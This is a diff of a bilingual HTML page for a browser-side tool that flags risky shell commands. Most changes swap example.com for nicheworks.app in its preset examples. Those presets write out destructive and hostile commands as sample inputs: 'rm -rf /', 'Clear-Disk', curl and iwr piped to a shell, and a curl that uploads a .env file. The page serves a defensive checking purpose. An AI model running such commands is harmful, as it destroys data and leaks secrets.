@@ -94,7 +94,7 @@
   </header>
 
   <main class="nw-main">
-    <div class="ad-slot ad-top">広告枠（準備中）</div>
+    <div class="ad-slot ad-top">広告枠</div>
 
     <section class="card intro-card">
       <h2 class="h2"><span data-i18n="ja">まずこれだけ</span><span data-i18n="en">Start here</span></h2>
@@ -125,7 +125,7 @@
         </div>
         <div class="field grow">
           <label class="label" for="cmdInput"><span data-i18n="ja">コマンド（複数行OK）</span><span data-i18n="en">Command (multi-line OK)</span></label>
-          <textarea id="cmdInput" class="textarea" rows="10" placeholder="rm -rf ./build&#10;curl -fsSL https://example.com/install.sh | sh"></textarea>
+          <textarea id="cmdInput" class="textarea" rows="10" placeholder="rm -rf ./build&#10;curl -fsSL https://nicheworks.app/install.sh | sh"></textarea>
           <p class="hint" data-i18n="ja">入力内容は外部送信されません。チェックはブラウザ内で完結します。</p>
           <p class="hint" data-i18n="en">Your input is not uploaded. Checks run locally in your browser.</p>
         </div>
@@ -142,11 +142,11 @@
         <div class="preset-buttons">
           <button class="btn" type="button" data-added="csc" data-os="unix" data-preset="rm -rf /">rm -rf /</button>
           <button class="btn" type="button" data-added="csc" data-os="unix" data-preset="sudo rm -rf /">sudo rm -rf /</button>
-          <button class="btn" type="button" data-added="csc" data-os="unix" data-preset="curl https://example.com/install.sh | sh">curl | sh</button>
+          <button class="btn" type="button" data-added="csc" data-os="unix" data-preset="curl https://nicheworks.app/install.sh | sh">curl | sh</button>
           <button class="btn" type="button" data-added="csc" data-os="unix" data-preset="chmod -R 777 ./app">chmod -R 777</button>
           <button class="btn" type="button" data-added="csc" data-os="unix" data-preset="git reset --hard HEAD~1">git reset --hard</button>
-          <button class="btn" type="button" data-added="csc" data-os="unix" data-preset="curl --data-binary @.env https://example.com/upload">.env upload</button>
-          <button class="btn" type="button" data-added="csc" data-os="powershell" data-preset="iwr https://example.com/install.ps1 | iex">PowerShell iwr | iex</button>
+          <button class="btn" type="button" data-added="csc" data-os="unix" data-preset="curl --data-binary @.env https://nicheworks.app/upload">.env upload</button>
+          <button class="btn" type="button" data-added="csc" data-os="powershell" data-preset="iwr https://nicheworks.app/install.ps1 | iex">PowerShell iwr | iex</button>
           <button class="btn" type="button" data-added="csc" data-os="powershell" data-preset="Remove-Item -Recurse -Force .\build">Remove-Item -Recurse</button>
           <button class="btn" type="button" data-added="csc" data-os="powershell" data-preset="Clear-Disk -Number 1 -RemoveData">Clear-Disk</button>
         </div>
@@ -179,7 +179,7 @@
       <div class="faq-item"><h3 data-i18n="ja">Highが出たらどうすべきですか？</h3><h3 data-i18n="en">What should I do when High appears?</h3><p data-i18n="ja">そのまま実行せず、対象パス、URL、送信先、権限、代替案を確認してください。迷う場合は実行しないのが安全です。</p><p data-i18n="en">Do not run it as-is. Check the path, URL, destination, privilege level, and alternatives. If unsure, do not run it.</p></div>
     </section>
 
-    <div class="ad-slot ad-bottom">広告枠（準備中）</div>
+    <div class="ad-slot ad-bottom">広告枠</div>
     <div class="nw-donate"><p class="nw-donate-text" data-i18n="ja">このツールが役に立ったら、開発継続のためのご支援をいただけると嬉しいです。</p><p class="nw-donate-text" data-i18n="en">If this tool helped, consider supporting development.</p><div class="nw-donate-links"><a href="https://ofuse.me/nicheworks" target="_blank" rel="noopener">💌 OFUSE</a><a href="https://ko-fi.com/nicheworks" target="_blank" rel="noopener">☕ Ko-fi</a></div></div>
     <div class="nw-links"><a href="/tools/api-key-token-redactor/">API Key Token Redactor</a> / <a href="/tools/log-formatter/">LogFormatter</a> / <a href="/tools/json-repair/">JSON Repair</a> / <a href="/tools/sql-db-risk-checker/">SQL DB Risk Checker</a></div>
   </main>
